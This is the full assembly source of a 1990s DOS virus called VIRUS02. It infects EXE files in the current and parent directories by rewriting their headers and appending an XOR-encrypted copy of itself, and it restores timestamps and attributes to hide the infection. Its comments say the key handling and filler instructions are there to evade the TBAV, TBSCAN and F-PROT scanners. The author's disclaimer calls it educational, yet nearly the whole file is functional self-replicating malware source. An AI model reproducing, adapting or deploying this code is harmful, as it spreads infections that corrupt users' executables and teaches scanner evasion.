;
;	VIRUS02.ASM
;
;	Author: Johan Gardhage <johan.gardhage@gmail.com>
;	Originally written in 1995.
;
; Description:
; This virus is a non-resident infector of EXE files, encrypted with an
; XOR algorithm.
;
; The virus infects EXE files in the current directory and walks upward
; through parent directories to the root, then restores the starting
; directory.
;
; Disclaimer:
; I take no responsibility for any damage, either direct or implied,
; caused by the usage of this virus source code or of the resulting code
; after assembly. The code was written for educational purposes ONLY.
;

	.model tiny
	.code
	.startup
	locals @@
	assume ss:nothing				; this EXE infector runs with SS != DS

VirusSize	equ	EndVirus-BeginVirus
ExeMarker	equ	'JG'

;---------------------------------------------------------------------
;	The virus begins here
;---------------------------------------------------------------------

BeginVirus:
	jmp	EntryPoint

;---------------------------------------------------------------------
;	Start of encrypted section
;---------------------------------------------------------------------

BeginEncryptedSection:
	cld						; clear direction flag

	mov	ah, 1ah					; set new dta area
	lea	dx, [bp+DtaArea]
	int	21h

	mov	bx, es
	push	cs					; es points to code segment
	pop	es

	lea	si, [bp+ExeRegs+4]			; prepares the return code
	lea	di, [bp+ExeRegs]
	movsw						; transfer buffer contents
	lodsw
	add	ax, bx					; bx holds start es = psp
	add	ax, 10h
	stosw

	lea	di, [bp+ExeRegs+12]
	lea	si, [bp+ExeRegs+8]
	lodsw						; prepares the restore of ss/sp
	add	ax, bx
	add	ax, 10h
	stosw
	movsw

	mov	ah, 47h					; save starting directory
	xor	dl, dl
	lea	si, [bp+SaveDir]
	int	21h

FindNewFiles:						; start finding files
	mov	ah, 4eh
	mov	cx, 7
	lea	dx, [bp+Pattern]

FindFiles:
	int	21h

	jnc	OpenFile				; if found a file
	mov	ah, 47h					; else get current directory
	xor	dl, dl					; current drive
	lea	si, [bp+CwdBuf]
	int	21h
	cmp	byte ptr [bp+CwdBuf], 0			; at the root? (empty path)
	jne	@@goup					; not root -> go up
	jmp	NoMoreFiles				; root: stop (cd .. succeeds at root -> would loop)
@@goup:	lea	dx, [bp+DirMask]			; go up one directory
	mov	ah, 3bh
	int	21h
	jmp	FindNewFiles				; and scan the parent

OpenFile:
	mov	ax, 4301h				; clear file attributes
	xor	cx, cx
	lea	dx, [bp+DtaArea+1eh]
	int	21h

	mov	ax, 3d02h				; open the found file
	lea	dx, [bp+DtaArea+1eh]
	int	21h
	jnc	@@opened
	jmp	RestoreAttr
@@opened:
	xchg	ax, bx					; file handle in bx

	mov	ah, 3fh					; read the exe header
	mov	cx, 24
	lea	dx, [bp+ExeHead]
	int	21h

	lea	si, [bp+ExeHead]			; check if it's an executable
	lodsw
	cmp	ax, 'ZM'
	je	CheckIfInfected
	cmp	ax, 'MZ'
	je	CheckIfInfected
	jmp	CloseFile				; else jump

CheckIfInfected:
	add	si, 10h					; saving another byte
	; lea	si,[bp+ExeHead+12h]
	lodsw
	cmp	ax, ExeMarker				; is it already infected?
	jne	InfectFile
	jmp	CloseFile

InfectFile:
	lea	di, [bp+ExeRegs+4]			; save the files ip/cs
	movsw
	movsw

	lea	si, [bp+ExeHead+0eh]			; save the files ss/sp
	movsw
	movsw

	lea	di, [bp+ExeHead+12h]			; mark the file infected
	mov	ax, ExeMarker
	stosw

	mov	al, 2h					; Go EOF
	call	SetFilePointer				; dx/ax is file length

	mov	cx, 16					; use div to save bytes
	div	cx
	sub	ax, word ptr ds:[bp+ExeHead+8]
	xchg	dx, ax
	stosw						; put new ip/cs in ExeHead
	xchg	dx, ax
	stosw

	inc	ax					; put new ss/sp in ExeHead
	inc	ax
	mov	word ptr [bp+ExeHead+0eh], ax
	mov	word ptr [bp+ExeHead+10h], 4b0h

	call	WriteVirus

	mov	al, 2h					; Go EOF
	call	SetFilePointer

	mov	cx, 512					; get filesize in 512 modules
	div	cx
	or	dx, dx
	jz	@@exact
	inc	ax
@@exact:mov	word ptr [bp+ExeHead+2], dx		; put modulo/filesize in
	mov	word ptr [bp+ExeHead+4], ax		; exe header

	xor	al, al					; Go SOF
	call	SetFilePointer

	mov	ah, 40h					; write new exe header
	mov	cx, 24
	lea	dx, [bp+ExeHead]
	int	21h

	lea	si, [bp+DtaArea+16h]			; restore time/date stamp
	mov	cx, word ptr [si]
	mov	dx, word ptr [si+2]
	mov	ax, 5701h
	int	21h

CloseFile:
	mov	ah, 3eh					; Close file
	int	21h

RestoreAttr:
	mov	ax, 4301h				; restore file attribute
	xor	ch, ch
	mov	cl, byte ptr [bp+DtaArea+15h]
	lea	dx, [bp+DtaArea+1eh]
	int	21h

	mov	ah, 4fh					; Find next
	jmp	FindFiles

NoMoreFiles:
	lea	dx, [bp+SaveDir]			; restore starting directory
	mov	ah, 3bh
	int	21h

	pop	es					; restore old es/ds
	pop	ds

	cli						; put back original ss/sp
	mov	ss, word ptr cs:[bp+ExeRegs+12]
	mov	sp, word ptr cs:[bp+ExeRegs+14]
	sti						; interrupts allowed again

	db	0eah					; jmp to original ip
ExeRegs	dw	0, 0, 0, 0fff0h, 0, 0, 0, 0
DirMask	db	'..', 0
Pattern	db	'*.exe', 0

;---------------------------------------------------------------------
;	Helper functions
;---------------------------------------------------------------------

SetFilePointer:
	mov	ah, 42h					; Jump in file
	xor	cx, cx
	cwd
	int	21h
	ret

WriteVirus:
	mov	ah, 2ch					; Get random number
	int	21h
	xor	dh, dh					; Keep key small so TBSCAN
	or	dl, 00001010b				; won't flag garbage ops
	mov	word ptr [bp+Key], dx

	mov	ax, 08d00h				; Copy virus to 8d00h:100h
	mov	es, ax
	mov	di, 100h
	lea	si, [bp+BeginVirus]
	mov	cx, (VirusSize+1)/2
	rep	movsw
	push	es
	pop	ds
	push	bp
	xor	bp, bp					; And encrypt it there
	call	EncryptDecrypt

	mov	ah, 40h					; Write virus to file
	mov	cx, VirusSize
	lea	dx, [bp+BeginVirus]
	int	21h
	pop	bp

	push	cs					; cs=ds=es
	push	cs
	pop	ds
	pop	es
	ret

EndEncryptedSection:

;---------------------------------------------------------------------
;	End of encrypted section
;---------------------------------------------------------------------

EntryPoint:
	push	ax
	pop	ax
	push	ax
	pop	ax
	call	GetDelta
EncryptDecrypt:
	mov	dx, word ptr ds:[bp+Key]		; routine here to
	lea	si, [bp+BeginEncryptedSection]		; fool TBAV/F-PROT
	mov	cx, (EndEncryptedSection-BeginEncryptedSection)/2
@@loop:	xor	word ptr ds:[si], dx			; Simple xor-loop
	inc	si					; encryption
	inc	si
	loop	@@loop
	ret
Key	dw	0					; en/decrypt value
GetDelta:
	pop	bp
	sub	bp, offset EncryptDecrypt		; Get delta offset
	push	ds					; save es & ds
	push	es
	push	cs					; and point ds to code segment
	pop	ds
	call	EncryptDecrypt				; Decrypt virus
	jmp	BeginEncryptedSection

EndVirus:

;---------------------------------------------------------------------
;	The heap begins below
;---------------------------------------------------------------------

ExeHead	db	24 dup (?)
DtaArea	db	43 dup (?)
SaveDir	db	64 dup (?)
CwdBuf	db	64 dup (?)

end
